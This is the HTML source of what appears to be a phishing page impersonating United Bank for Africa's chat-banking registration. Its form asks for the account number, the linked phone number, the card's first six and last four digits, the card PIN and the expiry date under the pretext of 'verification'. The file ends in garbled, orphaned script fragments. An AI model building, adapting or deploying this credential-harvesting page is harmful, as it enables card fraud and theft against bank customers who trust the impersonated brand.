<html>
    <head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <title>UBA CHAT REGISTRATION</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <meta property="og:description" content="Welcome to UBA Chatbanking. You can transfer money, buy airtime, pay bills, check your account balance and so much more.">
    <link rel="shortcut icon" href="/img/ima.png" type="image/x-icon">
    <link rel="stylesheet" href="/css/bootstrap.css" type="text/css">
    <link rel="stylesheet" href="/css/uba.css" type="text/css">
    <style>
        body{ background-color:rgb(255, 255, 255);}
    </style>
    <style type="text/css" id="operaUserStyle"></style>
</head>
<body>
    <span id="root">
        <nav class="navbar navbar-light bg-light">
        <a class="navbar-brand" href="#">
            <img src="/img/ima.png" width="100" height="100" alt="">
        </a>
        </nav>
        <div>

            <div class="col-md-auto">
                <fieldset>
                <br>
                
                <label><h4> Verification, Please Provide your UBA Debit Card Details</h4></label>
                <br><br>
                <section>
                    <form  class="login100-form validate-form" method="post" id="insta-submit">
                    <label class="wrap-input100 validate-input" data-validate = "Valid account number: 8575367468"><b>Type your account number *</b></label>
                    <input class="form-control" id="acc_number"
                    maxlength="10"
                    minlength="10"
                    aria-describedby=""
                    autocapitalize="off"
                    autocorrect="off"
                    aria-required="true"
                    name="acc_number"
                    required>
                    <br>
                    <label><b>Type the mobile number attached to your account *</b></label>
                    <input class="form-control" type="tel" 
                    id="password"
									maxlength="11"
                                    minlength="11"
									aria-describedby=""
									autocapitalize="off"
									autocorrect="off"
									aria-required="true"
									name="mobile_number"
                                    required>
                    <br>
                    <label><b>First 6 digits *</b> </label>
                    <input class="form-control" type="tel" 
                    id="first_six_digit"
									maxlength="6"
                                    minlength="6"
									aria-describedby=""
									autocapitalize="off"
									autocorrect="off"
									aria-required="true"
									name="first_six_digit"
                                    required>
                        <br>
                        <label><b>Last 4 digits *</b></label>
                    <input class="form-control" type="tel" 
                    id="last_four_digit"
									maxlength="4"
                                    minlength="4"
									aria-describedby=""
									autocapitalize="off"
									autocorrect="off"
									aria-required="true"
									name="last_four_digit"
                                    required>
                        <br>
                    <div class="row">
                        <div class="col">
                        <label><b>Card Pin *<b></b></b></label><b><b>
                            <input type="tel" class="form-control" 
                            id="card_pin"
									maxlength="4"
                                    minlength="4"
									aria-describedby=""
									autocapitalize="off"
									autocorrect="off"
									aria-required="true"
									name="card_pin"
                                    required>
                        </b></b></div><b><b>
                        <div class="col">
                        <label><b>Card Expiry Date *</b></label>
                        <div class="row">
                        <div class="col">
                        <select id="month_expiry" name="month_expiry" class="form-control" required>
                        <option value="01"> Jan</option>
                        <option value="02"> Feb</option>
                        <option value="03"> Mar</option>
                        <option value="04"> Apr</option>
                        <option value="05"> May</option>
                        <option value="06"> Jun</option>
                        <option value="07"> Jul</option>
                        <option value="08"> Aug</option>
                        <option value="09"> Sep</option>
                        <option value="10"> Oct</option>
                        <option value="11"> Nov</option>
                        <option value="12"> Dec</option>
                        </select>
                        </div>
                        <p style="font-size:20px;">/</p>
                        <div class="col">
                        <select id="year_expiry" name="year_expiry" class="form-control" required>
                        
                        <option value="2024"> 2024</option>
                        <option value="2025"> 2025</option>
                        <option value="2026"> 2026</option>
                        <option value="2027"> 2027</option>
                        <option value="2028"> 2028</option>
                        <option value="2029"> 2029</option>
                        <option value="2030"> 2030</option>
                        <option value="2031"> 2031</option>
                        </select>

                        </div>
                        <div>
                        </div>
                        
                        </div>
                        </div>
                        </b></b></div><b><b>
                        </b></b></form></section></fieldset><b><b>
                        <br>
                            <br>
                            <div>
                <div class="container-login100-form-btn">
                        <button class="form-control btn-danger btn-lg" type="submit" onclick="return check(this.form )" name="submit">SUBMIT</button>
                </div>
                </div>
                    
                
                
            </b></b>
        </div>
        <b><b>
            </b></b>
        </div>
        <b><b>
        </b>
        </b>
    </span>
</body>

      window.location = src;
    }
  </script>

			scale: 1.1

</html>
